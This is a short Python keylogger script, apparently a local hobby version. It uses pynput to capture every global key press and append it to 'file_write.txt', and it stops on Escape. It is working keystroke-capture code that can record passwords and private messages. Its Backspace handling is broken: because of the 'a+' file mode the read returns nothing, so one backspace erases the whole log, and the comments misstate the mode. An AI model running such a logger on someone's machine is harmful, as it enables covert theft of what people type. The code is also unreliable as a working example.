from pynput import keyboard

def on_press(key):
    """
    Keyshift Logger(Local)

    Keyshift saves data from keyboard input and writes it to a file named "file_write.txt" and saves it within the project folder
    The only change is desktop path is removed and file mode is a+ instead of r+

    """
    # Create file to write data
    logged_data = "file_write.txt"

    # Opened using read and write mode "r+"
    with open(logged_data, 'a+') as fout:
        script_content = fout.read()
        # If Normal Character
        if hasattr(key, 'char') and key.char is not None:
             fout.write(key.char)
        # if Spacebar
        elif key == keyboard.Key.space:
            fout.write(' ')
        # If Enter Key
        elif key == keyboard.Key.enter:
            fout.write('\n')
        # If Backspace
        elif key == keyboard.Key.backspace:
            fout.seek(0)
            fout.truncate()
            fout.write(script_content[:-1])
        # # Line limit
        # elif len(script_content) > 50:
        #     fout.write('\n')
            # Shift and Caps Lock
        elif key == keyboard.Key.caps_lock or key == keyboard.Key.shift:
            fout.write("")
        # If Special Character
        else:
            fout.write(f'{key}')
            # current_cursor_position += len(str(key)) 
        
    # Log every key press
    print(f'({key} pressed), (cursor_position: {len(script_content)})')
    fout.close()

    # If Key is Escape
    if key == keyboard.Key.esc:
        print("Key-log disabled")
        return False
        
with keyboard.Listener(on_press=on_press) as listener:
    print("Key-log enabled...")
    listener.join()